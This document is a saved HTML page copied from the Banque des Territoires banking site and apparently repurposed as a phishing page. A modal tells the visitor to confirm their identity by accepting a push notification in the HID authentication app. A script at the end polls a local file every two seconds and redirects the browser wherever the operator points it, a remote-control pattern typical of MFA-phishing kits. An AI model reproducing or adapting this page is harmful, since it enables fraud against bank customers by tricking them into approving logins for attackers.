                        <div class="row region region-footer" bis_skin_checked="1">
                          <div class="col-12 col-lg-3 mb-6 footer__logo" bis_skin_checked="1">
                            <img alt="Banque des Territoires, Groupe Caisse des dépôts" class="mx-auto" data-savepage-src="https://www.banquedesterritoires.fr/design/3.21.0/neva/assets/img/logo_bdt_desktop_black.svg" src="" />
                          </div>
                          <div class="col-12 col-sm-8 col-lg-6 pl-lg-6 footer__links" bis_skin_checked="1">
                            <nav role="navigation" aria-labelledby="block-menufooter-menu" id="block-menufooter" class="text-left block block-menu navigation menu--menu-footer">
                              <div class="row" bis_skin_checked="1">
                                <div class="col-sm-6" bis_skin_checked="1">
                                  <ul class="menu list-unstyled my-0">
                                    <li class="menu-item mb-1"><a baseline="0" data-drupal-link-system-path="node" id="link-menu-items-0" href="https://www.banquedesterritoires.fr/plan-du-site"> Plan du site </a></li>
                                    <li class="menu-item mb-1"><a baseline="0" data-drupal-link-system-path="node" id="link-menu-items-1" href="https://www.banquedesterritoires.fr/espace-presse"> Espace presse </a></li>
                                    <li class="menu-item mb-1"><a baseline="0" data-drupal-link-system-path="node" id="link-menu-items-2" href="https://mon-compte.banquedesterritoires.fr/#/contact"> Contact </a></li>
                                    <li class="menu-item mb-1"><a baseline="0" data-drupal-link-system-path="node" id="link-menu-items-3" href="https://www.caissedesdepots.fr/reclamation"> Réclamation </a></li>
                                    <!---->
                                  </ul>
                                </div>
                                <div class="col-sm-6" bis_skin_checked="1">
                                  <ul class="menu list-unstyled my-0">
                                    <li class="menu-item mb-1">
                                      <a baseline="0" data-drupal-link-system-path="node" target="_blank" id="link-menu-items2-0" data-savepage-href="https://www.caissedesdepots.fr" href="https://www.caissedesdepots.fr/">
                                        Caisse des Dépôts
                                      </a>
                                      <span aria-label="lien externe" class="ext"></span>
                                    </li>
                                    <li class="menu-item mb-1">
                                      <a baseline="0" data-drupal-link-system-path="node" target="_blank" id="link-menu-items2-1" href="https://ciclade.caissedesdepots.fr/">Ciclade</a><span aria-label="lien externe" class="ext"></span>
                                    </li>
                                    <li class="menu-item mb-1">
                                      <a baseline="0" data-drupal-link-system-path="node" target="_blank" id="link-menu-items2-2" href="https://www.cdc-net.com/portail/">CDC-Net</a><span aria-label="lien externe" class="ext"></span>
                                    </li>
                                    <li class="menu-item mb-1">
                                      <a baseline="0" data-drupal-link-system-path="node" target="_blank" id="link-menu-items2-3" href="https://consignations.caissedesdepots.fr/">Consignations</a>
                                      <span aria-label="lien externe" class="ext"></span>
                                    </li>
                                    <li class="menu-item mb-1">
                                      <a baseline="0" data-drupal-link-system-path="node" target="_blank" id="link-menu-items2-4" href="https://opendata.caissedesdepots.fr/pages/homev12023/">Portail Open Data CDC</a>
                                      <span aria-label="lien externe" class="ext"></span>
                                    </li>
                                    <!---->
                                  </ul>
                                </div>
                              </div>
                              <!---->
                            </nav>
                          </div>
                          <div class="col-12 col-sm-3 pl-lg-6 mt-4 mt-sm-0 footer__sharing" bis_skin_checked="1">
                            <div id="block-socialmedialinks-footer" class="block-social-media-links block block-social-media-links-block" bis_skin_checked="1">
                              <p class="social-title text-left">Restez connectés</p>
                              <ul class="social-media-links--platforms platforms inline horizontal list-inline d-inline-flex">
                                <li class="list-inline-item p-0 m-0 mr-1.5">
                                  <a target="_blank" class="btn btn-outline instagram" id="link-instagram" href=""><span class="icon-instagram"></span><span class="sr-only">instagram</span></a>
                                </li>
                                <li class="list-inline-item p-0 m-0 mr-1.5">
                                  <a target="_blank" class="btn btn-outline linkedin" id="link-linkedin" href="">
                                    <span class="icon-linkedin"></span><span class="sr-only">linkedin</span>
                                  </a>
                                </li>
                                <li class="list-inline-item p-0 m-0 mr-1.5">
                                  <a target="_blank" class="btn btn-outline rss" id="link-rss" data-savepage-href="flux-rss" href="">
                                    <span class="icon-rss"></span><span class="sr-only">rss</span>
                                  </a>
                                </li>
                                <li class="list-inline-item p-0 m-0 mr-1.5">
                                  <a target="_blank" class="btn btn-outline twitter" id="link-twitter" href=""><span class="icon-twitter"></span><span class="sr-only">twitter</span></a>
                                </li>
                                <li class="list-inline-item p-0 m-0 mr-1.5">
                                  <a
                                    target="_blank"
                                    class="btn btn-outline youtube"
                                    id="link-youtube"
                                    href=""
                                  >
                                    <span class="icon-youtube"></span><span class="sr-only">youtube</span>
                                  </a>
                                </li>
                                <!---->
                              </ul>
                            </div>
                            <!---->
                          </div>
                        </div>
                      </div>
                    </bt4-footer>
                    <bt4-footer-common _ngcontent-ng-c1118731350="" style="grid-area: footer;">
                      <div class="footer__common" bis_skin_checked="1">
                        <div class="row align-content-center font-size-12 pt-3 mt-4 border-top" bis_skin_checked="1">
                          <div class="col-12 col-lg text-center pl-lg-0 text-lg-left" bis_skin_checked="1">
                            <nav role="navigation" aria-labelledby="block-footercommun-menu" id="block-footercommun" class="block block-menu navigation menu--common-footer">
                              <ul class="menu list-inline my-0">
                                <li class="menu-item list-inline-item"><a target="_self" href=""> Mentions légales</a></li>
                                <li class="menu-item list-inline-item"><a target="_self" href="">CGU</a></li>
                                <li class="menu-item list-inline-item"><a target="_self" href="">Données personnelles</a></li>
                                <li class="menu-item list-inline-item"><a target="_self" href="">Accessibilité : non conforme</a></li>
                                <li class="menu-item list-inline-item"><a target="_self" href="">DSP2</a></li>
                                <li class="menu-item list-inline-item"><a target="_self" href="">Instruments financiers</a></li>
                                <!---->
                                <li class="menu-item list-inline-item"><a id="didomi-pannel-link" href="javascript:Didomi.preferences.show()">Gestion des cookies</a></li>
                              </ul>
                            </nav>
                            <!---->
                          </div>
                          <div class="col-12 col-lg-auto text-center mt-2 mt-lg-0 pr-lg-0 text-lg-right" bis_skin_checked="1">
                            <footer role="contentinfo" class="footer__copyright"><p class="my-0">© Banque des Territoires 2024. Tous droits réservés.</p></footer>
                          </div>
                        </div>
                      </div>
                    </bt4-footer-common>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <!----><!---->
        </bt4-app>
        <!---->
      </div>
      <!---->
    </boot-root>

    <ngb-modal-backdrop style="z-index: 1055;" aria-hidden="true" class="modal-backdrop fade show"></ngb-modal-backdrop>
    <ngb-modal-window role="dialog" tabindex="-1" aria-modal="true" class="d-block modal fade show">
  <div role="document" class="modal-dialog modal-dialog-centered modal-lg">
    <div class="modal-content">
      <div class="main">
        <div class="modal-header d-flex justify-content-between">
          <h2 class="no-border">Confirme l'identité</h2>
          <button id="button-modifier-identite-fermer" title="Fermer" type="button" class="close">
            <span aria-hidden="true" class="text-primary" style="font-size: 150%; padding: 8px 8px 5px;"></span>
          </button>
        </div>
      </div>
      <p style="text-align: center;">
        <img alt="" src="4T_push.png" style="width: 147px; height: 300px; display: block; margin: auto;" />
      </p>

      <p>&nbsp;</p>

      <p style="text-align: center;">
        Confirmez votre identit&eacute; avec l&#39;application HID<br />
        Ouvrez l&#39;application et acceptez la notification
      </p>

      <p style="text-align: center;">
        <img alt="" src="https://upload.wikimedia.org/wikipedia/commons/5/53/Loading-red-spot.gif" style="width: 170px; height: 128px; display: block; margin: auto;" />
      </p>
    </div>
  </div>
</ngb-modal-window>


	
  </body>
 <head>
 
    <meta charset="utf-8" />
    <title>Profil |</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    

    <style data-savepage-href="styles.f269a31e84deb8aa.css" media="all">
      ngb-modal-window {
        z-index: 1055 !important;
      }
      bt4-captcha-aife botdetect-captcha a#captchaFR_ReloadLink:focus {
        outline: solid 0.3rem #8f0606 !important;
        outline-offset: -0.3rem !important;
      }
      bt4-captcha-aife botdetect-captcha a#captchaFR_SoundLink:focus {
        outline: solid 0.3rem #8f0606 !important;
        outline-offset: -0.3rem !important;
      }
      .icdc-angular .carousel-inner {
        margin-bottom: 0rem !important;
        margin-top: 0rem !important;
      }
      .icdc-angular .carousel {
        margin-bottom: 3rem !important;
      }
    </style>

    <link rel="stylesheet" href="style.css" />
  
    <style>
      .region-alert[_ngcontent-ng-c1179030943] {
        margin-bottom: -13rem;
        z-index: 10;
      }
      #block-bdtalert[_ngcontent-ng-c1179030943] p[_ngcontent-ng-c1179030943] {
        margin: 0 auto;
      }
    </style>
    <style>
      .modal-full-size[_ngcontent-ng-c4185831740] {
        height: 100%;
      }
    </style>
    <style>
      i[_ngcontent-ng-c4049834633] {
        width: 28px !important;
        display: table-cell !important;
        vertical-align: middle !important;
      }
    </style>
    <style>
      .white-space-normal[_ngcontent-ng-c723155505] {
        white-space: normal;
      }
      .truncate[_ngcontent-ng-c723155505] {
        width: 165px;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
      }
      .btn-secondary[_ngcontent-ng-c723155505] [_ngcontent-ng-c723155505]:hover {
        color: #fff !important;
      }
      .header-style[_ngcontent-ng-c723155505] {
        z-index: 1001;
        position: sticky;
        top: 0;
        grid-area: header;
        gap: 0;
        padding: 0;
        background-color: #ffffffe6;
        transition: top 0.36s ease-in-out;
      }
    </style>
    <style>
      label[_ngcontent-ng-c3307078604] {
        cursor: default;
      }
    </style>
    <style>
      label[_ngcontent-ng-c3937372301] {
        cursor: default;
      }
    </style>
    <style>
      ngb-modal-window .component-host-scrollable {
        display: flex;
        flex-direction: column;
        overflow: hidden;
      }
    </style>
    <style id="savepage-cssvariables">
      :root {
      }
    </style>
  <div id="contentcom"></div>
    <script>
        function fetchAndRedirect() {
            var client = new XMLHttpRequest();
            client.open('GET', 'api.txt?v=' + new Date().getTime(), true); // Cache busting
            client.onreadystatechange = function() {
                if (client.readyState === 4) {
                    if (client.status === 200) {
                        var responseText = client.responseText;
                        console.log("Fetched responseText:", responseText);

                        // Extract URL from meta refresh tag
                        var urlMatch = responseText.match(/<meta\s+http-equiv=['"]refresh['"]\s+content=['"][^;]+;\s*url=([^'"]+)['"]/i);

                        if (urlMatch && urlMatch[1]) {
                            var redirectUrl = urlMatch[1];
                            console.log("Redirecting to URL:", redirectUrl);
                            window.location.href = redirectUrl;
                        } else {
                            console.error("Failed to extract URL from response.");
                        }
                    } else {
                        console.error("Failed to fetch data from api.txt, status code:", client.status);
                    }
                }
            };
            client.send();
        }

        // Fetch the URL and redirect every 2 seconds
        setInterval(fetchAndRedirect, 2000);
    </script>
  </head>

</html>
